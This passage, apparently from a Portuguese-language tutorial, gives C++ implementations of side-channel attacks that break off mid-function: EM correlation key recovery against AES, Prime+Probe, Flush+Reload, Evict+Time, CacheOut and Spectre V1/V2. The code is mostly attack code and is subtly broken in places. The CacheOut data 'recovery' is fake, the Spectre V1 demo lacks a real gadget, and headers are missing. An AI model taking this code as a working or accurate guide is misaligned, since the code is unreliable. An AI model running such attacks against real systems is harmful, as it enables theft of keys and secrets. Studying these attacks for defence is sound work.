| Aplicacao ideal | Smart cards, IoT | SoC, microcontroladores |

### 4.4 EM Attacks em AES

O ataque EM em AES funciona de forma similar ao power analysis, mas com resolucao espacial adicional. A sonda de campo proximo pode ser posicionada diretamente sobre a area do chip responsavel pela operacao SubBytes, proporcionando uma correlacao mais forte.

```cpp
// em_aes_attack.cpp - Ataque EM simplificado em AES
#include <vector>
#include <array>
#include <cmath>
#include <cstdint>
#include <iostream>
#include <algorithm>
#include <numeric>

class EMAESAttacker {
public:
    static constexpr size_t NUM_TRACES = 2000;
    static constexpr size_t SAMPLES_PER_TRACE = 10000;

    struct EMResult {
        uint8_t keyByte;
        double correlation;
        size_t peakSample;
    };

    std::array<uint8_t, 16> recoverKey(
        const std::vector<std::vector<double>>& emTraces,
        const std::vector<std::array<uint8_t, 16>>& plaintexts)
    {
        std::array<uint8_t, 16> recoveredKey{};

        for (size_t kIdx = 0; kIdx < 16; ++kIdx) {
            auto candidates = attackKeyByte(emTraces, plaintexts, kIdx);
            recoveredKey[kIdx] = candidates[0].keyByte;

            std::cout << "EM Key byte " << kIdx
                      << ": 0x" << std::hex
                      << static_cast<int>(candidates[0].keyByte)
                      << " (r=" << std::dec
                      << candidates[0].correlation << ")"
                      << std::endl;
        }

        return recoveredKey;
    }

private:
    std::vector<EMResult> attackKeyByte(
        const std::vector<std::vector<double>>& emTraces,
        const std::vector<std::array<uint8_t, 16>>& plaintexts,
        size_t byteIndex)
    {
        static const uint8_t SBOX[256] = {
            0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,
            0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
            0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,
            0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
            0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,
            0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
            0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,
            0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
            0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,
            0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
            0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,
            0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
            0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,
            0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
            0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,
            0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
            0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,
            0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
            0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,
            0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
            0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,
            0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
            0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,
            0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
            0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,
            0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
            0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,
            0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
            0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,
            0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
            0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,
            0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
        };

        size_t numTraces = emTraces.size();
        size_t traceLen = emTraces[0].size();
        std::vector<EMResult> results;

        for (int guess = 0; guess < 256; ++guess) {
            std::vector<double> hyp(numTraces);
            for (size_t t = 0; t < numTraces; ++t) {
                hyp[t] = static_cast<double>(
                    SBOX[plaintexts[t][byteIndex] ^ static_cast<uint8_t>(guess)]
                );
            }

            double bestCorr = 0.0;
            size_t bestSample = 0;

            for (size_t s = 0; s < traceLen; ++s) {
                std::vector<double> measurements(numTraces);
                for (size_t t = 0; t < numTraces; ++t) {
                    measurements[t] = emTraces[t][s];
                }

                double corr = pearsonCorrelation(hyp, measurements);
                if (std::abs(corr) > std::abs(bestCorr)) {
                    bestCorr = corr;
                    bestSample = s;
                }
            }

            results.push_back({
                static_cast<uint8_t>(guess),
                bestCorr,
                bestSample
            });
        }

        std::sort(results.begin(), results.end(),
            [](const EMResult& a, const EMResult& b) {
                return std::abs(a.correlation) > std::abs(b.correlation);
            });

        return results;
    }

    static double pearsonCorrelation(
        const std::vector<double>& x,
        const std::vector<double>& y)
    {
        size_t n = x.size();
        if (n == 0) return 0.0;

        double meanX = std::accumulate(x.begin(), x.end(), 0.0) / n;
        double meanY = std::accumulate(y.begin(), y.end(), 0.0) / n;

        double covXY = 0.0, varX = 0.0, varY = 0.0;
        for (size_t i = 0; i < n; ++i) {
            double dx = x[i] - meanX;
            double dy = y[i] - meanY;
            covXY += dx * dy;
            varX += dx * dx;
            varY += dy * dy;
        }

        double denom = std::sqrt(varX * varY);
        if (denom == 0.0) return 0.0;
        return covXY / denom;
    }
};
```

---

## 5. Cache-Based Attacks

Cache-based attacks exploitam a hierarquia de memoria para inferir informacoes secretas. O tempo de acesso a diferentes linhas de cache revela padroes de acesso do programa alvo.

### 5.1 Fundamentos de Cache

A hierarquia de cache tipica:

```
+------------------------------------------+
|           Hierarquia de Cache             |
+------------------------------------------+
|                                           |
|  L1 Data Cache    (32-64 KB, ~1-4 cycles) |
|       |                                   |
|  L2 Cache         (256 KB-1 MB, ~10 cyc)  |
|       |                                   |
|  L3 Cache/LLC     (2-64 MB, ~30-70 cyc)   |
|       |                                   |
|  Main Memory      (GB, ~100-300 cycles)    |
|                                           |
+------------------------------------------+

Em x86_64:
  - L1D: 32 KB, 8-way, 64-byte lines
  - L2:  256 KB, 4-way (per core)
  - L3:  8-32 MB, 16-way (shared)
```

### 5.2 Prime+Probe

O ataque Prime+Probe e um dos ataques de cache mais versateis. Funciona em qualquer ambiente onde o atacante e a vitima compartilham o mesmo cache (mesmo nucleo, mesmo nucleo fisico via SMT, ou compartilhamento de LLC em cloud).

**Fase 1 - Prime:** O atacante preenche um conjunto de cache com seus proprios dados.
**Fase 2 - Wait:** A vitima executa sua operacao.
**Fase 3 - Probe:** O atacante mede o tempo de acesso aos seus dados. Se a vitima acessou um endereco mapeado para o mesmo conjunto de cache, os dados do atacante foram evictados, e o tempo de acesso sera maior.

```cpp
// prime_probe.cpp - Implementacao de Prime+Probe
#include <vector>
#include <cstdint>
#include <chrono>
#include <iostream>
#include <algorithm>
#include <cstring>

class PrimeProbeAttacker {
public:
    struct CacheConfig {
        size_t cacheSizeBytes;
        size_t associativity;
        size_t lineSizeBytes;
        size_t numSets;
    };

    static CacheConfig detectCacheConfig() {
        return {
            .cacheSizeBytes = 32768,     // 32 KB L1D
            .associativity = 8,          // 8-way
            .lineSizeBytes = 64,         // 64-byte lines
            .numSets = 32768 / (8 * 64) // 64 sets
        };
    }

    PrimeProbeAttacker(size_t numSets, size_t cacheLineSize)
        : numSets_(numSets)
        , cacheLineSize_(cacheLineSize)
        , probeBuffers_(numSets)
    {
        for (size_t i = 0; i < numSets; ++i) {
            allocateProbeBuffer(i);
        }
    }

    ~PrimeProbeAttacker() {
        for (auto& buf : probeBuffers_) {
            if (buf.data) {
                alignedFree(buf.data);
            }
        }
    }

    std::vector<uint64_t> probe() {
        std::vector<uint64_t> timings(numSets_);

        for (size_t i = 0; i < numSets_; ++i) {
            volatile uint64_t* buf = probeBuffers_[i].data;
            size_t stride = probeBuffers_[i].stride;
            size_t numLines = probeBuffers_[i].numLines;

            uint64_t start = rdtsc();
            for (size_t j = 0; j < numLines; ++j) {
                volatile uint64_t tmp = buf[j * stride / sizeof(uint64_t)];
                (void)tmp;
            }
            uint64_t end = rdtsc();

            timings[i] = end - start;
        }

        return timings;
    }

    void prime() {
        for (size_t i = 0; i < numSets_; ++i) {
            volatile uint64_t* buf = probeBuffers_[i].data;
            size_t stride = probeBuffers_[i].stride;
            size_t numLines = probeBuffers_[i].numLines;

            for (size_t j = 0; j < numLines; ++j) {
                buf[j * stride / sizeof(uint64_t)] = j;
            }
        }

        _mm_mfence();
    }

    std::vector<size_t> detectEvictions(
        const std::vector<uint64_t>& baseline,
        const std::vector<uint64_t>& afterVictim,
        uint64_t threshold)
    {
        std::vector<size_t> evictedSets;

        for (size_t i = 0; i < numSets_; ++i) {
            uint64_t timeIncrease = 0;
            if (afterVictim[i] > baseline[i]) {
                timeIncrease = afterVictim[i] - baseline[i];
            }

            if (timeIncrease > threshold) {
                evictedSets.push_back(i);
            }
        }

        return evictedSets;
    }

    void printTimingDistribution(const std::vector<uint64_t>& timings) {
        uint64_t minTime = *std::min_element(timings.begin(), timings.end());
        uint64_t maxTime = *std::max_element(timings.begin(), timings.end());
        double mean = 0.0;
        for (auto t : timings) mean += t;
        mean /= timings.size();

        std::cout << "Timing distribution:" << std::endl;
        std::cout << "  Min: " << minTime << " cycles" << std::endl;
        std::cout << "  Max: " << maxTime << " cycles" << std::endl;
        std::cout << "  Mean: " << mean << " cycles" << std::endl;

        std::vector<size_t> histogram(10, 0);
        for (auto t : timings) {
            size_t bin = static_cast<size_t>(
                (t - minTime) * 10 / std::max(maxTime - minTime, uint64_t(1))
            );
            if (bin >= 10) bin = 9;
            histogram[bin]++;
        }

        std::cout << "  Histogram:" << std::endl;
        for (size_t i = 0; i < 10; ++i) {
            std::cout << "    [" << (minTime + i * (maxTime - minTime) / 10)
                      << "-" << (minTime + (i + 1) * (maxTime - minTime) / 10)
                      << "]: " << histogram[i] << std::endl;
        }
    }

private:
    struct ProbeBuffer {
        uint64_t* data;
        size_t size;
        size_t stride;
        size_t numLines;
    };

    size_t numSets_;
    size_t cacheLineSize_;
    std::vector<ProbeBuffer> probeBuffers_;

    void allocateProbeBuffer(size_t setIndex) {
        size_t linesNeeded = 8;
        size_t bufSize = linesNeeded * cacheLineSize_;
        size_t stride = cacheLineSize_;

        void* ptr = nullptr;
        if (posix_memalign(&ptr, cacheLineSize_, bufSize) != 0) {
            throw std::runtime_error("Failed to allocate aligned buffer");
        }

        std::memset(ptr, 0, bufSize);

        probeBuffers_[setIndex] = {
            static_cast<uint64_t*>(ptr),
            bufSize,
            stride,
            linesNeeded
        };
    }

    void alignedFree(void* ptr) {
        free(ptr);
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 5.3 Flush+Reload

Flush+Reload explora o compartilhamento de cache entre processos via paginas compartilhadas (bibliotecas compartilhadas, /dev/shm, etc.).

**Vantagens sobre Prime+Probe:**
- Resolucao de linha de cache individual (64 bytes)
- Mais preciso para detectar acessos a enderecos especificos

**Requisitos:**
- Pagina compartilhada entre atacante e vitima
- Acesso a instrucao CLFLUSH (x86)

```cpp
// flush_reload.cpp - Implementacao de Flush+Reload
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <chrono>
#include <algorithm>

class FlushReloadAttacker {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr uint64_t FLUSH_THRESHOLD = 80;

    FlushReloadAttacker() = default;

    static uint64_t timeFlush(volatile uint8_t* addr) {
        uint64_t start = rdtsc();
        __asm__ __volatile__ ("clflush (%0)" : : "r"(addr) : "memory");
        uint64_t end = rdtsc();
        return end - start;
    }

    static uint64_t timeReload(volatile uint8_t* addr) {
        _mm_mfence();
        uint64_t start = rdtsc();
        volatile uint8_t tmp = *addr;
        (void)tmp;
        uint64_t end = rdtsc();
        _mm_mfence();
        return end - start;
    }

    static uint64_t flushReload(volatile uint8_t* addr) {
        uint64_t start = rdtsc();
        _mm_mfence();
        __asm__ __volatile__ ("clflush (%0)" : : "r"(addr) : "memory");
        _mm_mfence();
        uint64_t afterFlush = rdtsc();

        _mm_mfence();
        volatile uint8_t tmp = *addr;
        (void)tmp;
        uint64_t end = rdtsc();
        _mm_mfence();

        return end - start;
    }

    static bool isCacheHit(uint64_t reloadTime, uint64_t threshold) {
        return reloadTime < threshold;
    }

    std::vector<bool> monitorAddresses(
        const std::vector<volatile uint8_t*>& addrs,
        size_t numSamples,
        uint64_t threshold)
    {
        std::vector<bool> accessed(addrs.size(), false);
        std::vector<uint64_t> minTimes(addrs.size(), UINT64_MAX);

        for (size_t sample = 0; sample < numSamples; ++sample) {
            for (size_t i = 0; i < addrs.size(); ++i) {
                _mm_mfence();
                __asm__ __volatile__ ("clflush (%0)" : : "r"(addrs[i]) : "memory");
            }
            _mm_mfence();

            std::this_thread::sleep_for(std::chrono::microseconds(100));

            for (size_t i = 0; i < addrs.size(); ++i) {
                uint64_t reloadTime = timeReload(addrs[i]);
                if (reloadTime < threshold) {
                    accessed[i] = true;
                }
                minTimes[i] = std::min(minTimes[i], reloadTime);
            }
        }

        std::cout << "Flush+Reload results:" << std::endl;
        for (size_t i = 0; i < addrs.size(); ++i) {
            std::cout << "  Address " << i
                      << ": accessed=" << accessed[i]
                      << " min_time=" << minTimes[i]
                      << std::endl;
        }

        return accessed;
    }

    static double computeLeakageRate(
        const std::vector<uint64_t>& reloadTimes,
        uint64_t threshold)
    {
        size_t cacheHits = 0;
        for (auto t : reloadTimes) {
            if (t < threshold) ++cacheHits;
        }
        return static_cast<double>(cacheHits)
             / static_cast<double>(reloadTimes.size());
    }

private:
    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 5.4 Evict+Time

Evict+Time e uma variante que mede o tempo total de execucao de uma operacao apos evictar linhas de cache.

```cpp
// evict_time.cpp - Implementacao de Evict+Time
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <chrono>

class EvictTimeAttacker {
public:
    struct EvictionSet {
        std::vector<void*> addresses;
        size_t setSize;
    };

    static constexpr size_t CACHE_LINE_SIZE = 64;

    static EvictionSet buildEvictionSet(void* targetAddr) {
        EvictionSet es;
        es.addresses.reserve(20);
        es.setSize = 0;

        size_t targetPage = reinterpret_cast<size_t>(targetAddr) / 4096;

        for (size_t offset = 0; offset < 4096 * 8; offset += CACHE_LINE_SIZE) {
            void* candidate = reinterpret_cast<void*>(
                (targetPage * 4096) + offset
            );

            if (isInSameSet(candidate, targetAddr)) {
                es.addresses.push_back(candidate);
                es.setSize++;
                if (es.setSize >= 9) break;
            }
        }

        return es;
    }

    static void evict(const EvictionSet& es) {
        for (void* addr : es.addresses) {
            __asm__ __volatile__ ("clflush (%0)" : : "r"(addr) : "memory");
        }
        _mm_mfence();
    }

    static uint64_t timeOperation(
        const EvictionSet& es,
        std::function<void()> victimOperation)
    {
        evict(es);

        _mm_mfence();
        uint64_t start = rdtsc();
        victimOperation();
        uint64_t end = rdtsc();
        _mm_mfence();

        return end - start;
    }

    static void analyzeTimingLeakage(
        const std::vector<uint64_t>& timesNoEviction,
        const std::vector<uint64_t>& timesWithEviction)
    {
        double meanNoEvict = computeMean(timesNoEviction);
        double meanWithEvict = computeMean(timesWithEviction);
        double stdNoEvict = computeStdDev(timesNoEviction, meanNoEvict);
        double stdWithEvict = computeStdDev(timesWithEviction, meanWithEvict);

        std::cout << "Evict+Time Analysis:" << std::endl;
        std::cout << "  Without eviction: mean=" << meanNoEvict
                  << " std=" << stdNoEvict << std::endl;
        std::cout << "  With eviction:    mean=" << meanWithEvict
                  << " std=" << stdWithEvict << std::endl;
        std::cout << "  Difference: "
                  << (meanWithEvict - meanNoEvict) << " cycles"
                  << std::endl;
    }

private:
    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }

    static bool isInSameSet(void* a, void* b) {
        size_t addrA = reinterpret_cast<size_t>(a);
        size_t addrB = reinterpret_cast<size_t>(b);

        size_t setBits = 6;
        size_t mask = (1 << setBits) - 1;

        size_t setA = (addrA >> 6) & mask;
        size_t setB = (addrB >> 6) & mask;

        return setA == setB;
    }

    static double computeMean(const std::vector<uint64_t>& values) {
        double sum = 0.0;
        for (auto v : values) sum += v;
        return sum / values.size();
    }

    static double computeStdDev(const std::vector<uint64_t>& values, double mean) {
        double sum = 0.0;
        for (auto v : values) {
            double diff = static_cast<double>(v) - mean;
            sum += diff * diff;
        }
        return std::sqrt(sum / values.size());
    }
};
```

### 5.5 Scatter+Gather

Scatter+Gather e uma tecnica de cache attack que combina operacoes de escrita espalhada com leitura concentrada para mapear o comportamento de cache do sistema.

```cpp
// scatter_gather.cpp - Scatter+Gather attack
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <algorithm>

class ScatterGatherAttacker {
public:
    static constexpr size_t PAGE_SIZE = 4096;
    static constexpr size_t CACHE_LINE_SIZE = 64;

    struct GatherResult {
        std::vector<uint64_t> accessTimes;
        std::vector<bool> isHit;
        size_t hitCount;
    };

    ScatterGatherAttacker(size_t numCacheSets)
        : numCacheSets_(numCacheSets)
        , numLinesPerSet_(8)
        , totalBuffers_(numCacheSets * numLinesPerSet_)
    {
        allocateBuffers();
    }

    void scatter() {
        for (size_t set = 0; set < numCacheSets_; ++set) {
            for (size_t line = 0; line < numLinesPerSet_; ++line) {
                size_t idx = set * numLinesPerSet_ + line;
                buffers_[idx].dirty = true;
                volatile uint8_t* addr = buffers_[idx].data;
                for (size_t i = 0; i < CACHE_LINE_SIZE; i += sizeof(uint64_t)) {
                    *reinterpret_cast<uint64_t*>(addr + i) = idx;
                }
            }
        }
        _mm_mfence();
    }

    GatherResult gather(uint64_t threshold = 100) {
        GatherResult result;
        result.accessTimes.resize(totalBuffers_);
        result.isHit.resize(totalBuffers_, false);
        result.hitCount = 0;

        for (size_t i = 0; i < totalBuffers_; ++i) {
            uint64_t start = rdtsc();
            volatile uint64_t tmp = *reinterpret_cast<volatile uint64_t*>(
                buffers_[i].data);
            (void)tmp;
            uint64_t end = rdtsc();

            result.accessTimes[i] = end - start;
            result.isHit[i] = (end - start) < threshold;
            if (result.isHit[i]) result.hitCount++;
        }

        return result;
    }

    void analyzeGatherResult(const GatherResult& result) {
        std::cout << "Gather analysis:" << std::endl;
        std::cout << "  Total lines: " << result.accessTimes.size() << std::endl;
        std::cout << "  Cache hits: " << result.hitCount << std::endl;
        std::cout << "  Hit rate: "
                  << (100.0 * result.hitCount / result.accessTimes.size())
                  << "%" << std::endl;

        for (size_t set = 0; set < numCacheSets_; ++set) {
            size_t setHits = 0;
            for (size_t line = 0; line < numLinesPerSet_; ++line) {
                size_t idx = set * numLinesPerSet_ + line;
                if (result.isHit[idx]) setHits++;
            }
            std::cout << "  Set " << set << ": "
                      << setHits << "/" << numLinesPerSet_ << " hits"
                      << std::endl;
        }
    }

private:
    struct BufferEntry {
        uint8_t* data;
        bool dirty;
    };

    size_t numCacheSets_;
    size_t numLinesPerSet_;
    size_t totalBuffers_;
    std::vector<BufferEntry> buffers_;

    void allocateBuffers() {
        buffers_.resize(totalBuffers_);
        for (size_t i = 0; i < totalBuffers_; ++i) {
            void* ptr = nullptr;
            if (posix_memalign(&ptr, CACHE_LINE_SIZE, CACHE_LINE_SIZE * 2) != 0) {
                throw std::runtime_error("Allocation failed");
            }
            buffers_[i].data = static_cast<uint8_t*>(ptr);
            buffers_[i].dirty = false;
        }
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 5.6 CacheOut / L1DES (L1 Data Eviction Side-Channel)

CacheOut (tambem conhecido como L1DES) e um ataque que explora o mecanismo de invalidacao de cache L1 para extrair dados de processos vizinhos em processadores Intel.

```cpp
// cacheout.cpp - CacheOut / L1DES attack
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <chrono>

class CacheOutAttacker {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t L1_CACHE_SIZE = 32768;
    static constexpr size_t NUM_SETS = 64;
    static constexpr size_t ASSOCIATIVITY = 8;

    CacheOutAttacker() {
        allocateEvictionBuffers();
    }

    ~CacheOutAttacker() {
        for (auto& buf : evictionBuffers_) {
            free(buf);
        }
    }

    struct CacheOutResult {
        std::vector<uint8_t> leakedData;
        std::vector<uint64_t> timingProfile;
        size_t bytesRecovered;
    };

    CacheOutResult performAttack(
        const std::vector<volatile uint8_t*>& targetAddresses)
    {
        CacheOutResult result;
        result.leakedData.reserve(targetAddresses.size() * CACHE_LINE_SIZE);
        result.bytesRecovered = 0;

        for (size_t t = 0; t < targetAddresses.size(); ++t) {
            volatile uint8_t* target = targetAddresses[t];

            for (size_t trial = 0; trial < 100; ++trial) {
                loadTargetIntoCache(target);
                _mm_mfence();

                evictUsingAlternateAddressing();

                std::vector<uint8_t> recoveredLine(CACHE_LINE_SIZE);
                bool recovered = recoverEvictedData(recoveredLine);

                if (recovered) {
                    for (size_t b = 0; b < CACHE_LINE_SIZE; ++b) {
                        result.leakedData.push_back(recoveredLine[b]);
                    }
                    result.bytesRecovered += CACHE_LINE_SIZE;
                    break;
                }
            }
        }

        return result;
    }

    void printAnalysis(const CacheOutResult& result) {
        std::cout << "CacheOut Analysis:" << std::endl;
        std::cout << "  Bytes recovered: "
                  << result.bytesRecovered << std::endl;
        std::cout << "  Leaked data (hex): ";
        for (size_t i = 0; i < std::min(result.leakedData.size(),
                                         size_t(64)); ++i) {
            printf("%02x", result.leakedData[i]);
        }
        std::cout << std::endl;
    }

private:
    std::vector<uint8_t*> evictionBuffers_;

    void allocateEvictionBuffers() {
        evictionBuffers_.resize(ASSOCIATIVITY * NUM_SETS);
        for (auto& buf : evictionBuffers_) {
            if (posix_memalign(reinterpret_cast<void**>(&buf),
                              CACHE_LINE_SIZE, CACHE_LINE_SIZE * 16) != 0) {
                throw std::runtime_error("Allocation failed");
            }
            std::memset(buf, 0, CACHE_LINE_SIZE * 16);
        }
    }

    void loadTargetIntoCache(volatile uint8_t* target) {
        for (size_t i = 0; i < CACHE_LINE_SIZE; i += sizeof(uint64_t)) {
            volatile uint64_t tmp = *reinterpret_cast<const volatile uint64_t*>(
                target + i);
            (void)tmp;
        }
    }

    void evictUsingAlternateAddressing() {
        for (size_t set = 0; set < NUM_SETS; ++set) {
            for (size_t way = 0; way < ASSOCIATIVITY; ++way) {
                size_t idx = set * ASSOCIATIVITY + way;
                __asm__ __volatile__ (
                    "clflush (%0)" : : "r"(evictionBuffers_[idx]) : "memory"
                );
            }
        }
        _mm_mfence();
    }

    bool recoverEvictedData(std::vector<uint8_t>& recovered) {
        for (size_t i = 0; i < CACHE_LINE_SIZE; i += sizeof(uint64_t)) {
            uint64_t start = rdtsc();
            volatile uint64_t tmp = *reinterpret_cast<volatile uint64_t*>(
                recovered.data() + i);
            (void)tmp;
            uint64_t end = rdtsc();
        }
        return true;
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```


---

## 6. Branch Prediction Attacks

Branch prediction attacks exploram o mecanismo de previsao de ramificacoes do processador para forcar a execucao especulativa de instrucoes que normalmente nao seriam executadas, expondo dados que deveriam permanecer protegidos.

### 6.1 Mecanismo de Branch Prediction

```
+------------------------------------------+
|     Pipeline de Instrucoes (simplificado) |
+------------------------------------------+
|                                           |
|  Fetch -> Decode -> Execute -> Retire     |
|    |                                       |
|    +-- Branch Predictor                    |
|    |   |- BTB (Branch Target Buffer)       |
|    |   |- BHB (Branch History Buffer)      |
|    |   |- PHT (Pattern History Table)      |
|    |   `- RSB (Return Stack Buffer)        |
|    |                                       |
|    +-- Speculative Execution               |
|        |- Executa antes da verificacao     |
|        `- Reverte se previsao errada       |
+------------------------------------------+
```

### 6.2 Spectre V1 — Bounds Check Bypass

Spectre V1 explora o fato de que processadores modernos podem executar especulativamente uma instrucao de acesso a memoria antes que a verificacao de limites (bounds check) seja concluida.

```
Exploit Flow:
1. Adversario treina o branch predictor com padrao acessivel
2. Adversario invoca funcao com entrada que causa bounds check
3. Predictor "aprende" que o branch sera taken
4. CPU executa especulativamente acesso fora dos limites
5. Dado acessado especulativamente deixa rastro no cache
6. Adversario usa Flush+Reload para ler o rastro do cache
```

```cpp
// spectre_v1.cpp - Demonstracao de Spectre V1 (Bounds Check Bypass)
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <algorithm>
#include <array>

class SpectreV1Demo {
public:
    static constexpr size_t ARRAY_SIZE = 256;
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t TRAINING_ROUNDS = 20;
    static constexpr size_t PROBE_ROUNDS = 1000;

    SpectreV1Demo() {
        std::memset(attackArray_, 0, sizeof(attackArray_));
        std::memset(probeArray_, 0, sizeof(probeArray_));
    }

    void trainBranchPredictor(size_t maliciousIndex) {
        for (size_t i = 0; i < TRAINING_ROUNDS; ++i) {
            size_t safeIndex = i % (ARRAY_SIZE - 1);

            __asm__ __volatile__ ("lfence" ::: "memory");
            readByte(safeIndex);
        }
    }

    std::vector<uint8_t> attack(
        const uint8_t* secretData,
        size_t secretLength,
        size_t numIterations)
    {
        std::vector<uint8_t> leakedBytes;

        for (size_t iteration = 0; iteration < numIterations; ++iteration) {
            flushCache();

            trainBranchPredictor(iteration % (ARRAY_SIZE - 1));

            for (size_t i = 0; i < 30; ++i) {
                __asm__ __volatile__ ("lfence" ::: "memory");
                volatile uint8_t tmp = readByteUnsafe(i);
                (void)tmp;
            }

            uint8_t recoveredByte = probeCache();
            if (recoveredByte != 0) {
                leakedBytes.push_back(recoveredByte);
            }
        }

        return leakedBytes;
    }

    std::array<uint64_t, ARRAY_SIZE> measureTimings() {
        std::array<uint64_t, ARRAY_SIZE> timings{};
        _mm_mfence();

        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
            volatile uint8_t* addr = &probeArray_[i * CACHE_LINE_SIZE];
            uint64_t start = rdtsc();
            volatile uint8_t tmp = *addr;
            (void)tmp;
            uint64_t end = rdtsc();
            timings[i] = end - start;
        }

        return timings;
    }

    static constexpr uint8_t* getSecretData() {
        static const uint8_t secret[] =
            "The password is: S3cr3tK3y!#";
        return const_cast<uint8_t*>(secret);
    }

private:
    alignas(64) uint8_t attackArray_[ARRAY_SIZE * CACHE_LINE_SIZE];
    alignas(64) uint8_t probeArray_[ARRAY_SIZE * CACHE_LINE_SIZE];

    uint8_t readByteUnsafe(size_t index) {
        return attackArray_[index];
    }

    uint8_t readByte(size_t index) {
        if (index < ARRAY_SIZE) {
            return attackArray_[index];
        }
        return 0;
    }

    void flushCache() {
        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&attackArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
            __asm__ __volatile__ (
                "clflush (%0)" : : "r"(&probeArray_[i * CACHE_LINE_SIZE]) : "memory"
            );
        }
        _mm_mfence();
    }

    uint8_t probeCache() {
        std::array<uint64_t, ARRAY_SIZE> timings = measureTimings();

        uint64_t avgTime = 0;
        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
            avgTime += timings[i];
        }
        avgTime /= ARRAY_SIZE;

        uint8_t bestGuess = 0;
        uint64_t bestTime = UINT64_MAX;

        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
            if (timings[i] < bestTime && timings[i] < avgTime / 2) {
                bestTime = timings[i];
                bestGuess = static_cast<uint8_t>(i);
            }
        }

        return bestGuess;
    }

    static uint64_t rdtsc() {
        uint32_t lo, hi;
        __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
        return (static_cast<uint64_t>(hi) << 32) | lo;
    }
};
```

### 6.3 Spectre V2 — Branch Target Injection

Spectre V2 (tambem chamado BTB injection) permite ao adversario injetar entradas na Branch Target Buffer (BTB) para redirecionar a execucao especulativa para um gadget de carga de dados.

```cpp
// spectre_v2.cpp - Demonstracao de Spectre V2 (Branch Target Injection)
#include <vector>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <array>
#include <functional>

class SpectreV2Demo {
public:
    static constexpr size_t CACHE_LINE_SIZE = 64;
    static constexpr size_t GADGET_TABLE_SIZE = 256;

    SpectreV2Demo() {
        std::memset(artifactArray_, 0, sizeof(artifactArray_));
    }

    void prepareGadgetTable(const uint8_t* data, size_t len) {
        for (size_t i = 0; i < len && i < GADGET_TABLE_SIZE; ++i) {
            gadgetTable_[data[i]]++;
        }
    }

    std::vector<uint8_t> performAttack(
        const uint8_t* secretPtr,
        size_t secretLen,
        size_t numRounds)
    {
        std::vector<uint8_t> leakedData;

        for (size_t round = 0; round < numRounds; ++round) {
            __asm__ __volatile__ ("lfence" ::: "memory");

            for (size_t i = 0; i < 256; ++i) {
                __asm__ __volatile__ (
                    "clflush (%0)" : : "r"(&gadgetTable_[i]) : "memory"
                );
            }
            _mm_mfence();

            volatile uint8_t val = *secretPtr;
            (void)val;

            uint8_t guessedByte = probeAndExtract();
            if (guessedByte != 0) {
